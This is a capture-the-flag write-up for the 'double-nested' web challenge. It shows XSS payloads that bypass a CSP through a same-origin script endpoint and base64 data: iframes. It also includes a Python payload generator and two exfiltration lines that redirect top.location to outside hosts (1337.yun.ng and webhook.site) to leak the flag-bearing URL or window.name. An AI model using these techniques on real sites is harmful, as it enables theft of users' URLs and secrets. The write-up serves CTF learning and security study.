---
created: 2025-06-06T17:44
updated: 2025-06-08T12:05
solves: 31
points: 477
---

It was immediately clear that we can get a 'hosted' JS endpoint with `/gen`.

This allows us to bypass the CSP and run scripts under `script-src 'self';`.

```
https://double-nested.tjc.tf/gen?query=1=1=1=alert(1)
```

And we can use base64 iframes to bypass the `script` blacklist (sort of).

*payload layer 1*

```html
<script src="https://double-nested.tjc.tf/gen?query=1=1=1=alert%281%29"></script>
```

*payload layer 2*

```html
<iframe src='data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PTE9MT0xPWFsZXJ0JTI4MSUyOSI+PC9zY3JpcHQ+'></iframe>
```

*final url*

```
https://double-nested.tjc.tf/?i=1%3D1%3D1%3D%3Ciframe+src%3D%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PTE9MT0xPWFsZXJ0JTI4MSUyOSI%2BPC9zY3JpcHQ%2B%27%3E%3C%2Fiframe%3E
```

This will show an alert.

Ok so how do we get the flag?

## get the flag

```js
await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
```

In the partial source given, we can see that the flag is included in the url, if we can access the query, hash or the url in any way we could get the flag.

But how do we get the parent's location url?

Reading it directly fails.

```
Uncaught SecurityError: Failed to read a named property 'href' from 'Location': Blocked a frame with origin "null" from accessing a cross-origin frame.
```

I tried using `<iframe srcdoc>` but I run into the problem of not able to bypass the blacklist on `script` or `&`.

I tried fancy `#:~:text=<text>` but it doesn't highlight text inside of an iframe.

My teammate shared a tweet with me [https://x.com/slonser_/status/1919439373986107814](https://x.com/slonser_/status/1919439373986107814 "https://x.com/slonser_/status/1919439373986107814")

Basically something along chrome leaking the full url with `referrer`.

However their poc don't work since images are blocked.

Then, I was reading through the documentations of `<iframe>` and then I realized that it also has `referrerPolicy` attribute.

Hrm... Let's just try it out, since I had referrer on my mind.

And it works, `document.referrer` now contains the full URL of the page that contains the `<iframe>`.

```python
import base64
import urllib.parse

from server import webhook

js_payload = urllib.parse.quote_plus(f"""
top.location = 'https://1337.yun.ng?i='+window['doc'+'ument'].referrer
""".strip())

html_payload = f"""
<script src="https://double-nested.tjc.tf/gen?query=1=1=1={js_payload}"></script>
""".strip()

b64payload = base64.b64encode(html_payload.encode()).decode()
payload = f"""
1=1=1=<iframe referrerpolicy='unsafe-url' src='data:text/html;base64,{b64payload}'>
""".strip()

print("https://double-nested.tjc.tf/?i="+urllib.parse.quote_plus(payload)+"flag{dummy}")

stop, wait = webhook(1337)
while True:
    wait()
```

```
Referer: https://1337.yun.ng/?i=https://double-nested.tjc.tf/?i=1%3D1%3D1%3D%3Ciframe+referrerpolicy%3D%27unsafe-url%27+src%3D%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PTE9MT0xPXRvcC5sb2NhdGlvbislM0QrJTI3aHR0cHMlM0ElMkYlMkYxMzM3Lnl1bi5uZyUzRmklM0QlMjclMkJ3aW5kb3clNUIlMjdkb2MlMjclMkIlMjd1bWVudCUyNyU1RC5yZWZlcnJlciI%2BPC9zY3JpcHQ%2B%27%3Eflag{dummy}tjctf{1t_w4s_4ll_scr1pt3d413a98u0}
```

```flag
tjctf{1t_w4s_4ll_scr1pt3d413a98u0}
```

---

My teammate @T!T4N had a different solve.

He used an `name` attribute which had no quotes so the flag would become the `window.name` of the child frame.

```html
<iframe src='data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vZG91YmxlLW5lc3RlZC50amMudGYvZ2VuP3F1ZXJ5PTE9MT0xPXRvcC5sb2NhdGlvbiUzRCUyN2h0dHBzJTNBJTJGJTJGd2ViaG9vay5zaXRlL2I5ZmRmMTA5LWNmYTMtNDdhMy05ZjMzLTc3ZDhlODYxYzAyMz8lMjclMkJ3aW5kb3cubmFtZSI+PC9zY3JpcHQ+' name=
```

Which then loads the script that leaks window.name to a webhook.

```html
<script src="https://double-nested.tjc.tf/gen?query=1=1=1=top.location%3D%27https%3A%2F%2Fwebhook.site/b9fdf109-cfa3-47a3-9f33-77d8e861c023?%27%2Bwindow.name"></script>
```

I do think we both had unintended solves, the regex part `re.sub(r"^(.*?=){,3}", "", input)` was completely useless to us, and the challenge's description has something on the filters which we didn't really exploit.
